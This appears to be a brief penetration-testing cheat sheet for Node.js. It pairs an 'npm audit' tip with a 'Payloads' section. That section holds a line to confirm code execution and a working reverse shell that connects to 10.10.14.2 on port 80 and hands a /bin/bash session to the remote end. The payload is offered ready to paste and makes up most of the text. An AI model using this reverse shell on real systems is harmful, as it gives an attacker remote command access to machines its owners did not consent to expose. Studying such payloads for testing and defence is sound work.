## Use NPM
```bash
# use npm to identify risks/outdated dependencies
npm audit
```


## Payloads
```js
// Verify Code Exeecution
require('util').log('hacked');

// Reverse Shell
var net = require("net"), sh = require("child_process").exec("/bin/bash");
var client = new net.Socket();
client.connect(80, "10.10.14.2", function () {
    client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client);
});
```